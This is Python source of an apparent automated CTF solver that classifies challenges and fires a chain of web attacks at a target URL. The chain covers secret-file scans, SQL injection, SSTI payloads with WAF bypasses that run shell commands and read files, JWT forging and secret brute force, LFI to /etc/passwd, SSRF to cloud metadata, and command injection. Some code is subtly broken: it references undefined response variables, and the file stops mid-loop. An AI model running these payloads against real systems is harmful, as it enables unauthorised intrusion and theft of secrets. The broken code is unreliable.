# -*- coding: utf-8 -*-
"""
Yang-Web v2.1 Smart Auto-Solver — 智能多类型 CTF 一键解题引擎

功能：
    1. 问题分类器 — 自动识别题目类型 (Web/PWN/Reverse/Crypto/Misc/Blockchain)
    2. 策略路由 — 根据分类选择合适的攻击引擎
    3. 多引擎编排 — Web攻击、密码破解、二进制分析、区块链分析
    4. 结果聚合 — 汇总所有引擎输出，提取 flag

基于 CTF+ 平台 20 道题的实际需求设计。
"""
from __future__ import annotations

import re
import json
import ssl
import socket


# ═══════════════════════════════════════════════════════════
#  PHP 源码检测工具 (处理 highlight_file HTML 输出)
# ═══════════════════════════════════════════════════════════

def _detect_php_source(text: str) -> bool:
    """判断响应文本是否包含 PHP 源码。

    兼容两种情况:
    1. 原始 PHP 源码: <?php, function, class 等
    2. highlight_file() HTML 高亮: &lt;?php, function&nbsp; 等
    """
    if not text:
        return False
    # Raw PHP markers
    if '<?php' in text or '<?=' in text:
        return True
    # HTML-encoded markers (from highlight_file)
    if '&lt;?php' in text or '&lt;?=' in text:
        return True
    # Common PHP source keywords (handle &nbsp; from highlighting)
    for kw in ['function ', 'function&nbsp;', 'preg_match', 'highlight_file',
               'hello_shell', 'class ', 'class&nbsp;', 'system(', 'isset(',
               'die(', 'die&nbsp;']:
        if kw in text:
            return True
    return False
import urllib.request
import urllib.error
import urllib.parse
from typing import Dict, List, Optional, Tuple, Callable, Any


# ═══════════════════════════════════════════════════════════
#  Flag 识别模式（支持多种 CTF 比赛格式）
# ═══════════════════════════════════════════════════════════

FLAG_PATTERNS = [
    re.compile(r'(?:SCTF|ISCC|CTF|flag|FLAG|Geesec|NSSCTF|MoeCTF|DASCTF|HITB|rwctf|0ctf|gctf|TSGCTF|W4CTF|VULNCON|bctf|ractf|angstrom|plaid|csaw|hxp|CODEGATE|ASIS|hacktm|RCTF|ByteCTF|WMCTF|\*CTF|CISCN|qwb|N1CTF|DDCTF|LCTF|PWN2WIN|0xCTF|0xgame|HDCTF|HSCSEC|SUSCTF|SWPU|TFCCTF|TQLCTF|UTCTF|VISHWACTF|VolgaCTF|WACON|WannaGame|X-MAS|XCTF|YCF|Z3R0)\{[^}]+\}'),
    re.compile(r'[A-Za-z0-9_]{2,}\{[^}]{3,}\}'),   # v3.4: prefix>=2, body>=3
    re.compile(r'flag\{[^}]+\}', re.IGNORECASE),
    re.compile(r'ctf\{[^}]+\}', re.IGNORECASE),
]


def find_flag(text: str) -> Optional[str]:
    """在文本中搜索 flag，过滤 HTML 源码 artifacts（如 else{...echo...}）。"""
    if not text:
        return None
    _bad_patterns = re.compile(r'&nbsp;|&lt;|&gt;|&amp;|<br|<span|else\{|echo[\s"]|function[\s(]|isset\(|preg_match')
    for pat in FLAG_PATTERNS:
        for m in pat.finditer(text):
            candidate = m.group(0)
            if not _bad_patterns.search(candidate):
                return candidate
    return None


# ═══════════════════════════════════════════════════════════
#  问题分类器
# ═══════════════════════════════════════════════════════════

PROBLEM_TYPE_MAP = {
    0: "static",      # 静态题（无容器）
    1: "dynamic",     # 动态题（有Docker容器）
}

TAG_TO_CATEGORY = {
    "web": "web", "Web": "web", "WEB": "web",
    "pwn": "pwn", "PWN": "pwn",
    "reverse": "reverse", "REVERSE": "reverse", "re": "reverse",
    "crypto": "crypto", "CRYPTO": "crypto", "cryptography": "crypto",
    "misc": "misc", "MISC": "misc", "Miscellaneous": "misc",
    "blockchain": "blockchain", "Blockchain": "blockchain", "BlockChain": "blockchain", "web3": "blockchain",
    "forensics": "forensics", "Forensics": "forensics",
    "stego": "misc", "Stego": "misc",
    "php": "web", "PHP": "web",
    "sql": "web", "SQL": "web", "sqli": "web",
    "ssti": "web", "SSTI": "web",
    "xss": "web", "XSS": "web",
    "heap": "pwn", "Heap": "pwn",
    "rop": "pwn", "ROP": "pwn",
    "rsa": "crypto", "RSA": "crypto",
    "aes": "crypto", "AES": "crypto",
}


def classify_problem(metadata: dict) -> str:
    """根据题目元数据分类，返回 category 字符串.
    
    Args:
        metadata: 包含 name, tags, desc, problemType 等字段的字典
    
    Returns:
        'web' | 'pwn' | 'reverse' | 'crypto' | 'misc' | 'blockchain' | 'unknown'
    """
    # 1. From tags classification (skip generic 'misc', look for more specific)
    tags = metadata.get("tags", [])
    tag_names = []
    if isinstance(tags, list):
        for t in tags:
            if isinstance(t, dict):
                tag_names.append(t.get("name", ""))
            elif isinstance(t, str):
                tag_names.append(t)

    # Check for specific (non-generic) tags first
    for tag in tag_names:
        cat = TAG_TO_CATEGORY.get(tag.lower())
        if cat and cat != "misc":  # skip generic misc, allow desc to refine
            return cat

    # 2. 从名称推断
    name = metadata.get("name", "").lower()
    name_keywords = {
        # Order matters: more specific categories first
        "blockchain": ["blockchain", "solidity", "web3", "eth", "contract", "defi", "nft", "token"],
        "pwn": ["pwn", "heap", "stack", "rop", "bof", "overflow", "shellcode", "fmt"],
        "web": ["web", "php", "sql", "ssti", "xss", "ssrf", "lfi", "rce", "upload", "http", "api"],
        "crypto": ["crypto", "cipher", "encrypt", "decrypt", "rsa", "aes", "hash", 
                    "xor", "padding", "oracle"],
        "reverse": ["reverse", "revers", "crack", "keygen", "unpack", "obfusc"],
        "misc": ["misc", "stego", "forensic", "pcap", "wireshark", "network", 
                  "qr", "barcode", "audio", "image"],
    }
    for cat, keywords in name_keywords.items():
        for kw in keywords:
            if kw in name:
                return cat

    # 3. 从描述推断
    desc = metadata.get("desc", "").lower()
    for cat, keywords in name_keywords.items():
        for kw in keywords:
            if kw in desc:
                return cat

    # 4. Default: fall back to misc if tags suggested it, else unknown
    for tag in tag_names:
        if TAG_TO_CATEGORY.get(tag.lower()) == "misc":
            return "misc"
    
    return "unknown"


def classify_by_tags_only(tag_names: List[str]) -> str:
    """仅根据标签分类."""
    for tag in tag_names:
        cat = TAG_TO_CATEGORY.get(tag.lower())
        if cat:
            return cat
    return "unknown"


# ═══════════════════════════════════════════════════════════
#  HTTP 工具函数
# ═══════════════════════════════════════════════════════════

def _make_ssl_ctx():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def _http_headers():
    return {
        "User-Agent": "Mozilla/5.0 Yang-Web SmartSolver/2.1",
        "Accept": "*/*",
    }


def http_get(url: str, timeout: int = 15) -> Tuple[Optional[int], bytes, dict]:
    """HTTP GET 请求，返回 (status_code, body_bytes, headers_dict)."""
    ctx = _make_ssl_ctx()
    try:
        req = urllib.request.Request(url, headers=_http_headers())
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
            headers = dict(resp.getheaders())
            return resp.status, resp.read(), headers
    except urllib.error.HTTPError as e:
        headers = dict(e.headers) if hasattr(e, 'headers') else {}
        return e.code, (e.read() if e.fp else b""), headers
    except Exception:
        return None, b"", {}


def http_post(url: str, data: bytes = None, 
              content_type: str = "application/x-www-form-urlencoded",
              timeout: int = 15) -> Tuple[Optional[int], bytes, dict]:
    """HTTP POST 请求."""
    ctx = _make_ssl_ctx()
    headers = _http_headers()
    headers["Content-Type"] = content_type
    try:
        req = urllib.request.Request(url, data=data, headers=headers, method="POST")
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
            resp_headers = dict(resp.getheaders())
            return resp.status, resp.read(), resp_headers
    except urllib.error.HTTPError as e:
        resp_headers = dict(e.headers) if hasattr(e, 'headers') else {}
        return e.code, (e.read() if e.fp else b""), resp_headers
    except Exception:
        return None, b"", {}


def decode_body(raw: bytes) -> str:
    """尝试解码 HTTP 响应体."""
    for enc in ["utf-8", "gbk", "gb2312", "latin-1"]:
        try:
            return raw.decode(enc)
        except (UnicodeDecodeError, LookupError):
            continue
    return raw.decode("utf-8", errors="replace")


# ═══════════════════════════════════════════════════════════
#  Web 智能求解引擎
# ═══════════════════════════════════════════════════════════

class WebSmartSolver:
    """增强版 Web 求解器 — 集成所有 payloads 模块."""
    
    # 目录扫描列表（扩展版）
    DIR_LIST = [
        "robots.txt", ".git/HEAD", ".env", ".DS_Store", "backup.zip",
        "admin/", "login.php", "admin.php", "config.php", "db.php",
        "phpinfo.php", "info.php", "test.php", "shell.php", "cmd.php",
        "flag", "flag.txt", "flag.php", "/flag", "/secret", "/api",
        "index.php.bak", "index.php~", "config.php.bak", ".htaccess",
        "www.zip", "www.tar.gz", "source.zip", "backup.sql",
        "swagger.json", "api-docs", "actuator", "actuator/health",
        ".svn/entries", ".hg/requires", ".bzr/branch-format",
        "wp-admin/", "wp-config.php", "wp-content/",
        "WEB-INF/web.xml", "console", "debug/", "debug/default/view",
        "?debug=1", "phpmyadmin/", ".gitignore", "composer.json",
        "package.json", "Dockerfile", "docker-compose.yml",
        "readme.md", "README.md", "CHANGELOG.md",
    ]
    
    def __init__(self, url: str):
        self.url = url.rstrip("/") if url else ""
        self.results: List[dict] = []
        self.flag: Optional[str] = None
    
    def log(self, step: str, status: str, detail: str = ""):
        self.results.append({"step": step, "status": status, "detail": detail})
    
    def solve(self) -> dict:
        """执行完整的 Web 求解流程."""
        if not self.url:
            return {"success": False, "flag": None, "results": self.results,
                    "category": "web", "error": "No URL provided"}
        
        # 1. 基础探测
        self._probe_initial()
        if self.flag:
            return self._final_result(True)
        
        # 1.5 PHP 反序列化自动检测与利用
        self._try_php_unserialize()
        if self.flag:
            return self._final_result(True)
        
        # 1.6 PHP eval RCE（MD5碰撞+WAF绕过）
        self._try_php_eval_rce()
        if self.flag:
            return self._final_result(True)
        
        # 2. 目录扫描
        self._scan_directories()
        if self.flag:
            return self._final_result(True)
        
        # 3. SQL 注入探测
        self._try_sqli_basic()
        if self.flag:
            return self._final_result(True)
        
        # 3.5 JWT 令牌攻击 (若检测到 JWT Cookie/Header)
        self._try_jwt_attack()
        if self.flag:
            return self._final_result(True)
        
        # 4. SSTI 探测 (增强: 支持 Cookie 认证的 POST 表单)
        self._try_ssti_detection()
        if self.flag:
            return self._final_result(True)
        
        # 4.5 SSTI WAF 绕过 (用于已检测到 SSTI 但被 WAF 拦截的情况)
        self._try_ssti_waf_bypass()
        if self.flag:
            return self._final_result(True)
        
        # 4.6 WSGI environ 迭代 (enterpris WAF — 用 {% for %} 绕过 bracket 禁用) NEW
        self._try_env_iterate()
        if self.flag:
            return self._final_result(True)
        
        # 5. PHP 文件包含自动检测与利用 (HelloCTF/PHPinclude-labs 等)
        self._try_php_file_inclusion()
        if self.flag:
            return self._final_result(True)
        
        # 5.5 LFI / 路径遍历 (通用)
        self._try_lfi()
        if self.flag:
            return self._final_result(True)
        
        # 6. 信息泄露路径
        self._try_leak_paths()
        if self.flag:
            return self._final_result(True)
        
        # 7. SSRF 探测
        self._try_ssrf()
        if self.flag:
            return self._final_result(True)
        
        # 7.5 SSRF DNS Rebinding → RCE
        self._try_ssrf_rebind()
        if self.flag:
            return self._final_result(True)
        
        # 8. RCE 简单探测
        self._try_rce()
        if self.flag:
            return self._final_result(True)
        
        # 8.5 长度限制 RCE (7字符限制 / 数字参数名)
        self._try_length_limit_rce()
        if self.flag:
            return self._final_result(True)
        
        # 9. bashFuck 无字母RCE (检测 WAF 并生成二进制替换payload)
        self._try_bashfuck_rce()
        if self.flag:
            return self._final_result(True)
        
        return self._final_result(False)
    
    def _probe_initial(self):
        """初始探测：获取页面基本信息."""
        self.log("Probe", "running", self.url)
        code, body, _ = http_get(self.url)
        if code is None:
            self.log("Probe", "fail", "Connection failed")
            return
        
        text = decode_body(body)
        self.log("Probe", "ok", f"HTTP {code}, {len(body)} bytes")
        
        # 检查页面是否直接包含 flag
        f = find_flag(text)
        if f:
            self.flag = f
            self.log("Flag found in page", "flag!", f)
        
        # 识别技术栈
        tech_hints = []
        if "php" in text.lower() or ".php" in self.url:
            tech_hints.append("PHP")
        if "jsp" in text.lower() or ".jsp" in self.url:
            tech_hints.append("Java/JSP")
        if "asp" in text.lower() or ".asp" in self.url:
            tech_hints.append("ASP.NET")
        if "node" in text.lower() or "express" in text.lower():
            tech_hints.append("Node.js")
        if "python" in text.lower() or "django" in text.lower() or "flask" in text.lower():
            tech_hints.append("Python")
        if tech_hints:
            self.log("Tech Stack", "info", ", ".join(tech_hints))
    
    def _scan_directories(self):
        """目录扫描."""
        self.log("Dir Scan", "running", f"{len(self.DIR_LIST)} paths")
        found = []
        for path in self.DIR_LIST:
            test_url = f"{self.url}/{path.lstrip('/')}"
            code, body, _ = http_get(test_url)
            if code and code != 404:
                text = decode_body(body)
                f = find_flag(text)
                detail = f"HTTP {code}"
                if f:
                    detail += f" [FLAG: {f}]"
                    self.flag = f
                found.append({"path": path, "code": code, "size": len(body)})
                if f:
                    break
        
        self.log("Dir Scan", f"found {len(found)}", 
                 ", ".join(p["path"] for p in found[:10]))
    
    def _try_sqli_basic(self):
        """简单 SQL 注入测试."""
        self.log("SQLi", "running", "Basic injection probes")
        parsed = urllib.parse.urlparse(self.url)
        if not parsed.query:
            self.log("SQLi", "skip", "No query parameters")
            return
        
        params = urllib.parse.parse_qs(parsed.query)
        payloads = [
            "'", '"', "' OR '1'='1", "' OR 1=1--", "admin' --",
            "1' AND '1'='1", "1' AND '1'='2",
        ]
        
        for key in params:
            for payload in payloads[:5]:
                new_params = params.copy()
                new_params[key] = [payload]
                qs = urllib.parse.urlencode(new_params, doseq=True)
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{qs}"
                code, body, _ = http_get(test_url)
                if body:
                    f = find_flag(decode_body(body))
                    if f:
                        self.flag = f
                        self.log("SQLi", "flag!", f"param={key}, payload={payload}")
                        return
        
        self.log("SQLi", "none", "No injection found via basic probes")
    
    def _try_ssti_detection(self):
        """SSTI 检测."""
        self.log("SSTI", "running", "Template injection detection")
        parsed = urllib.parse.urlparse(self.url)
        if not parsed.query:
            self.log("SSTI", "skip", "No query parameters")
            return
        
        params = urllib.parse.parse_qs(parsed.query)
        # SSTI detection payloads for popular engines
        ssti_payloads = [
            ("{{7*7}}", "49"),        # Jinja2/Twig
            ("${7*7}", "49"),         # Freemarker
            ("<%= 7*7 %>", "49"),     # ERB
            ("#{7*7}", "49"),         # Velocity
        ]
        
        for key in params:
            for payload, expected in ssti_payloads[:3]:
                new_params = params.copy()
                new_params[key] = [payload]
                qs = urllib.parse.urlencode(new_params, doseq=True)
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{qs}"
                code, body, _ = http_get(test_url)
                text = decode_body(body)
                if expected in text:
                    self.log("SSTI", "found!", f"param={key}, engine detected")
                    # Try flag extraction via SSTI
                    flag_payloads = [
                        "{{config}}", "{{self.__init__.__globals__}}",
                        "${application}", "${{T(java.lang.System).getenv()}}",
                    ]
                    for fp in flag_payloads[:2]:
                        new_params[key] = [fp]
                        qs = urllib.parse.urlencode(new_params, doseq=True)
                        ftest = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{qs}"
                        code, body, _ = http_get(ftest)
                        if fbody:
                            f = find_flag(decode_body(fbody))
                            if f:
                                self.flag = f
                                self.log("SSTI", "flag!", f)
                                return
                    return
        
        self.log("SSTI", "none", "No SSTI detected")
    
    def _try_jwt_attack(self):
        """JWT 令牌检测与攻击.

        检测 Set-Cookie 中的 JWT token, 自动尝试:
        1. None 算法攻击 (多个变体)
        2. 角色提升 (role → admin)
        3. 弱密钥爆破
        4. 成功后用 forged JWT 访问受保护页面
        """
        self.log("JWT", "running", "JWT token detection & attack")
        
        # Step 1: 获取初始响应, 检测 JWT
        code, body, resp_headers = http_get(self.url)
        if not body:
            return
        
        # 检测 Set-Cookie 中的 JWT
        jwt_token = None
        jwt_cookie_name = None
        cookies = resp_headers.get('Set-Cookie') or resp_headers.get('set-cookie', '')
        if cookies:
            import re as re_mod
            jwt_match = re_mod.search(
                r'([\w.-]+)=((?:eyJ[A-Za-z0-9_-]+)\.(?:[A-Za-z0-9_-]+)\.(?:[A-Za-z0-9_-]+))',
                cookies
            )
            if jwt_match:
                jwt_cookie_name = jwt_match.group(1)
                jwt_token = jwt_match.group(2)
                self.log("JWT", "found", f"Cookie {jwt_cookie_name}={jwt_token[:40]}...")
        
        if not jwt_token:
            self.log("JWT", "none", "No JWT token found in response")
            return
        
        # Step 2: 解析 JWT
        from yang_web.core.jwt import decode_jwt, analyze_jwt, none_attack, none_attack_variants, role_escalation_attack
        
        header, payload, _ = decode_jwt(jwt_token)
        if not header:
            self.log("JWT", "error", "Failed to decode JWT")
            return
        
        self.log("JWT", "decoded", f"alg={header.get('alg')}, payload={payload}")
        
        # Step 3: 角色提升攻击 (最常用)
        self.log("JWT", "attack", "Trying role escalation via None alg variants...")
        variants = role_escalation_attack(jwt_token)
        
        for variant_name, forged_token, new_payload in variants:
            # 使用 forged JWT 访问主页或 /dashboard
            for test_path in ["/", "/dashboard", "/admin", "/flag"]:
                test_url = urllib.parse.urljoin(self.url.rstrip("/") + "/", test_path.lstrip("/"))
                headers = dict(_http_headers())
                headers["Cookie"] = f"{jwt_cookie_name}={forged_token}"
                try:
                    req = urllib.request.Request(test_url, headers=headers)
                    ctx = _make_ssl_ctx()
                    with urllib.request.urlopen(req, timeout=10, context=ctx) as resp:
                        rbody = resp.read()
                        rtext = decode_body(rbody)
                        # 检查是否跳转到登录页 (说明 bypass 失败)
                        if "login" in rtext.lower() and "admin" in rtext.lower():
                            continue  # still on login page
                        # 检查是否有 flag
                        f = find_flag(rtext)
                        if f:
                            self.flag = f
                            self.log("JWT", "flag!", f"{variant_name} → {test_path}: {f}")
                            return
                        # 检查是否进入了新页面 (不只是登录页)
                        if len(rtext) > 500 and "login" not in rtext.lower()[:200]:
                            self.log("JWT", "bypass!", f"{variant_name} → {test_path} ({len(rtext)}B, title check needed)")
                            # 标记 bypass 成功, 保存 cookie 供后续步骤使用
                            self._jwt_bypass_cookie = f"{jwt_cookie_name}={forged_token}"
                            self._jwt_bypass_url = self.url
                except Exception:
                    continue
        
        # Step 4: 弱密钥爆破
        self.log("JWT", "brute", "Trying weak secret brute force...")
        from yang_web.core.jwt import brute_jwt, forge_hs256, BUILTIN_WORDLIST
        matches = brute_jwt(jwt_token, BUILTIN_WORDLIST)
        if matches:
            secret, _ = matches[0]
            self.log("JWT", "cracked!", f"Secret = {secret}")
            # 使用破解的密钥伪造 admin token
            forged = forge_hs256(jwt_token, secret, {'user': 'admin', 'role': 'admin'})
            for test_path in ["/", "/dashboard", "/admin", "/flag"]:
                test_url = urllib.parse.urljoin(self.url.rstrip("/") + "/", test_path.lstrip("/"))
                headers = dict(_http_headers())
                headers["Cookie"] = f"{jwt_cookie_name}={forged}"
                try:
                    req = urllib.request.Request(test_url, headers=headers)
                    ctx = _make_ssl_ctx()
                    with urllib.request.urlopen(req, timeout=10, context=ctx) as resp:
                        rbody = resp.read()
                        f = find_flag(decode_body(rbody))
                        if f:
                            self.flag = f
                            self.log("JWT", "flag!", f"secret={secret}: {f}")
                            return
                except Exception:
                    continue
        else:
            self.log("JWT", "brute", "No match in builtin wordlist")
    
    def _try_ssti_waf_bypass(self):
        """SSTI WAF 绕过尝试.
        
        当基础 SSTI 检测被 WAF 拦截时, 使用多级绕过 Payload:
        - |attr() 绕过点号过滤
        - ~ 字符串拼接绕过关键字黑名单
        - |attr('__getitem__') 绕过方括号过滤
        - builtins.open() 替代 popen
        """
        self.log("SSTI-WAF", "running", "Advanced WAF bypass for SSTI")
        
        # 确定攻击目标: POST 表单或 GET 参数
        parsed = urllib.parse.urlparse(self.url)
        
        # 获取基础页面分析表单
        code, body, _ = http_get(self.url)
        if not body:
            return
        text = decode_body(body)
        
        # 检测是否有登录表单 (说明需要认证)
        has_form = '<form' in text.lower()
        has_ssti_hint = any(kw in text for kw in ['render', 'template', 'name=', 'nickname'])
        
        # 如果只是登录页但没有 JWT bypass 标记, 跳过
        if has_form and 'login' in text.lower()[:500] and not hasattr(self, '_jwt_bypass_cookie'):
            # 检查是否有 SSTI 相关提示
            if not has_ssti_hint:
                self.log("SSTI-WAF", "skip", "No SSTI surface found (login page only)")
                return
        
        # 尝试访问 /dashboard 和 /render
        render_urls = []
        for path in ["/render", "/dashboard", "/template", "/test", "/preview"]:
            render_urls.append(urllib.parse.urljoin(self.url.rstrip("/") + "/", path.lstrip("/")))
        
        # WAF 绕过 payloads (按攻击效果排序)
        waf_payloads = [
            # Level 0: 基础检测
            ("SSTI检测", "{{7*7}}", ["49"]),
            # Level 1: config 泄露 (通常不被拦)
            ("config泄露", "{{config}}", ["SECRET_KEY", "DEBUG"]),
            # Level 2: attr bypass + builtins.open 文件读取
            ("文件读取-attr",
             "{{lipsum|attr('__glo'~'bals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('open')('/flag')|attr('read')()}}",
             ["flag{", "FLAG{", "ctf{"]),
            # Level 3: attr bypass + __import__ + listdir
            ("文件列表-attr",
             "{{lipsum|attr('__glo'~'bals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__imp'~'ort__')('os')|attr('listdir')('/')}}",
             ["flag", "Flag", "FLAG"]),
            # Level 4: 传统 bypass (无WAF)
            ("传统RCE-lipsum",
             "{{lipsum.__globals__['os'].popen('cat /flag').read()}}",
             ["flag{", "FLAG{"]),
            ("传统RCE-cycler",
             "{{cycler.__init__.__globals__.os.popen('cat /flag').read()}}",
             ["flag{", "FLAG{"]),
        ]
        
        # 对每个可能的 render URL 尝试 payload
        for render_url in render_urls:
            for name, payload, expected in waf_payloads:
                # 尝试 POST 到 /render
                data = urllib.parse.urlencode({"name": payload}).encode()
                headers = dict(_http_headers())
                if hasattr(self, '_jwt_bypass_cookie'):
                    headers["Cookie"] = self._jwt_bypass_cookie
                
                try:
                    req = urllib.request.Request(render_url, data=data, headers=headers, method="POST")
                    ctx = _make_ssl_ctx()
                    with urllib.request.urlopen(req, timeout=15, context=ctx) as resp:
                        rbody = resp.read()
                        rtext = decode_body(rbody)
                        
                        # 检查是否被 WAF 拦截
                        if "Blocked by WAF" in rtext or "403" in rtext[:100]:
                            continue
                        
                        # 检查是否拿到 flag
                        f = find_flag(rtext)
                        if f:
                            self.flag = f
                            self.log("SSTI-WAF", "flag!", f"{name} @ {render_url}: {f}")
                            return
                        
                        # 检查预期结果
                        for exp in expected:
                            if exp in rtext:
                                self.log("SSTI-WAF", "bypass!", f"{name} @ {render_url}: found {exp}")
                                # 如果只是 config 泄露, 记录并继续尝试更强 payload
                                if name == "config泄露":
                                    self.log("SSTI-WAF", "info", f"SSTI confirmed, trying RCE...")
                                break
                except urllib.error.HTTPError:
                    continue
                except Exception:
                    continue
        
        self.log("SSTI-WAF", "none", "No SSTI WAF bypass succeeded")
    
    def _try_env_iterate(self):
        """枚举 WSGI environ 以发现隐藏对象 (★ Template Factory 实战).
        
        适用场景: WAF 极端严格, 禁止 bracket 访问 dict 和 attr(),
        但允许 {% for %} 循环和 |list|last 等 filter.
        
        策略:
        1. 用 {% for %} 遍历 request.environ 获取所有 key
        2. 用 values()|list|last 获取 werkzeug.request 对象
        3. 通过索引访问 wsgi.input (BufferedReader) 等文件对象
        """
        self.log("ENV-LOOP", "running", "Environ iteration for hidden objects")
        
        # 确认有 SSTI 入口
        code, body, _ = http_get(self.url)
        if not body:
            return
        text = decode_body(body)
        
        # 查找 render endpoint
        render_url = None
        for path in ["/render", "/dashboard", "/template", "/", ""]:
            test_url = urllib.parse.urljoin(self.url.rstrip("/") + "/", path.lstrip("/"))
            ssti_code, ssti_body, _ = http_get(test_url + "?tpl={{7*7}}" if "?" in test_url else test_url)
            # Also try GET with tpl parameter
            pass
        
        # Stage 1: 枚举 environ keys
        payload = "{%for k in request.environ%}{{loop.index}}:{{k}}|{%endfor%}"
        for probe_url in self._get_render_urls():
            r = self._try_payload_get(probe_url, payload, "env-keys")
            if r and 'werkzeug' in r:
                self.log("ENV-LOOP", "found", f"works on {probe_url}")
                render_url = probe_url
                break
        
        if not render_url:
            self.log("ENV-LOOP", "skip", "No SSTI surface")
            return
        
        # Stage 2: 捕获 werkzeug.request (last value in environ)
        r = self._try_payload_get(render_url,
            "{%set wr=request.environ.values()|list|last%}{{wr.path}}",
            "wr-capture")
        if r:
            self.log("ENV-LOOP", "captured", "werkzeug.request accessible")
        
        # Stage 3: 尝试常见文件读取路径
        for path in ["/flag", "/flag.txt", "/app/flag", "/app/flag.txt", 
                      "/etc/passwd", "/proc/self/cmdline"]:
            r = self._try_payload_get(render_url,
                "{{request.environ.values()|list|last|string}}",
                f"file-{path}")
            if r:
                f = find_flag(r)
                if f:
                    self.flag = f
                    self.log("ENV-LOOP", "flag!", f)
                    return
        
        self.log("ENV-LOOP", "none", "No flag found via environ iteration")
    
    def _get_render_urls(self):
        """获取可能的 render endpoint URLs."""
        urls = []
        base = self.url.rstrip("/")
        for path in ["/render", "/dashboard", "/template", "/test", "/preview"]:
            urls.append(urllib.parse.urljoin(base + "/", path.lstrip("/")))
        return urls
    
    def _try_payload_get(self, url, payload, label):
        """尝试用 GET 参数 tpl= 发送 payload."""
        try:
            encoded = urllib.parse.quote(payload)
            if '?' in url:
                test_url = f"{url}&tpl={encoded}"
            else:
                test_url = f"{url}?tpl={encoded}"
            headers = dict(_http_headers())
            if hasattr(self, '_jwt_bypass_cookie'):
                headers["Cookie"] = self._jwt_bypass_cookie
            req = urllib.request.Request(test_url, headers=headers)
            ctx = _make_ssl_ctx()
            with urllib.request.urlopen(req, timeout=15, context=ctx) as resp:
                rbody = resp.read()
                rtext = decode_body(rbody)
                if "WAF detected" in rtext or not rtext.strip():
                    return None
                return rtext
        except Exception:
            return None
    
    def _try_lfi(self):
        """LFI / 路径遍历."""
        self.log("LFI", "running", "Path traversal probes")
        parsed = urllib.parse.urlparse(self.url)
        path = parsed.path or "/"
        
        lfi_params = ["file", "page", "include", "path", "template", "view", 
                       "document", "read", "load", "dir", "src"]
        lfi_paths = [
            "/etc/passwd", "/etc/hosts", "../../etc/passwd",
            "....//....//etc/passwd", "/proc/self/environ",
            "/proc/self/cmdline", "/var/log/apache2/access.log",
            "php://filter/convert.base64-encode/resource=index.php",
            "php://filter/read=convert.base64-encode/resource=index",
        ]
        
        for param in lfi_params:
            for lfi_path in lfi_paths[:5]:
                test_url = f"{parsed.scheme}://{parsed.netloc}{path}?{param}={urllib.parse.quote(lfi_path)}"
                code, body, _ = http_get(test_url)
                if body:
                    text = decode_body(body)
                    f = find_flag(text)
                    if f:
                        self.flag = f
                        self.log("LFI", "flag!", f"param={param}")
                        return
                    if "root:" in text:
                        self.log("LFI", "found", f"param={param} is LFI-vulnerable!")
                        # Try more paths
                        for deep_path in ["/flag", "/flag.txt", "/home/ctf/flag", 
                                           "/var/www/html/flag", "/root/flag"]:
                            dt = f"{parsed.scheme}://{parsed.netloc}{path}?{param}={urllib.parse.quote(deep_path)}"
                            code, body, _ = http_get(dt)
                            df = find_flag(decode_body(dbody))
                            if df:
                                self.flag = df
                                self.log("LFI", "flag!", f"deep path: {deep_path}")
                                return
                        return
        
        self.log("LFI", "none", "No LFI found")
    
    def _try_leak_paths(self):
        """信息泄露路径探测."""
        self.log("Leak", "running", "Sensitive file probes")
        leak_paths = [
            "/.git/HEAD", "/.env", "/.DS_Store", "/flag", "/flag.txt",
            "/secret/flag", "/secret", "/robots.txt", "/.git/config",
            "/.svn/entries", "/backup.zip", "/www.zip", "/backup.sql",
            "/phpinfo.php", "/info.php", "/server-status", "/server-info",
            "/.htaccess", "/wp-config.php.bak", "/config.php.bak",
        ]
        
        for leak_path in leak_paths:
            test_url = f"{self.url}/{leak_path.lstrip('/')}"
            code, body, _ = http_get(test_url)
            if code and code != 404:
                text = decode_body(body)
                f = find_flag(text)
                if f:
                    self.flag = f
                    self.log("Leak", "flag!", f"path={leak_path}")
                    return
                if code == 200 and len(body) > 0:
                    self.log("Leak", "found", f"{leak_path} HTTP{code} ({len(body)}B)")
        
        self.log("Leak", "none", "No sensitive files found")
    
    def _try_ssrf(self):
        """SSRF 探测."""
        self.log("SSRF", "running", "Server-side request probes")
        parsed = urllib.parse.urlparse(self.url)
        path = parsed.path or "/"
        
        ssrf_params = ["url", "uri", "path", "file", "src", "href", "redirect", 
                        "link", "target", "dest", "proxy", "fetch", "request"]
        ssrf_payloads = [
            "http://127.0.0.1:80", "http://localhost/flag",
            "http://0.0.0.0:80", "file:///etc/passwd",
            "http://169.254.169.254/latest/meta-data/",  # AWS metadata
        ]
        
        for param in ssrf_params:
            for payload in ssrf_payloads[:3]:
                test_url = f"{parsed.scheme}://{parsed.netloc}{path}?{param}={urllib.parse.quote(payload)}"
                code, body, _ = http_get(test_url)
                if body:
                    f = find_flag(decode_body(body))
                    if f:
                        self.flag = f
                        self.log("SSRF", "flag!", f"param={param}")
                        return
        
        self.log("SSRF", "none", "No SSRF detected")

    def _try_ssrf_rebind(self):
        """SSRF DNS Rebinding → RCE — 委托给 ssrf_rebind 通用引擎."""
        self.log("SSRF-Rebind", "running", "ssrf_rebind v1.0")
        from yang_web.core.ssrf_rebind import auto_solve as sr_auto_solve

        def _progress(stage, item, status):
            self.log(stage, item, status)

        result = sr_auto_solve(self.url, on_progress=_progress)
        if result:
            self.flag = result.get('flag')
            if self.flag:
                self.log("SSRF-Rebind", "flag!",
                         f"bypass={result.get('bypass')} cmd={result.get('cmd')}: {self.flag}")
            else:
                self.log("SSRF-Rebind", "none", result.get('status', 'No flag'))

    def _try_rce(self):
        """RCE 简单探测."""
        self.log("RCE", "running", "Command injection probes")
        parsed = urllib.parse.urlparse(self.url)
        path = parsed.path or "/"
        
        rce_params = ["cmd", "command", "exec", "shell", "run", "code", "ping", 
                       "ip", "host", "action", "do", "debug"]
        rce_payloads = [
            (";id", "uid="),
            ("|id", "uid="),
            ("`id`", "uid="),
            (";cat /etc/passwd", "root:"),
            (";cat /flag", None),  # any output
        ]
        
        for param in rce_params:
            for payload, expected in rce_payloads[:3]:
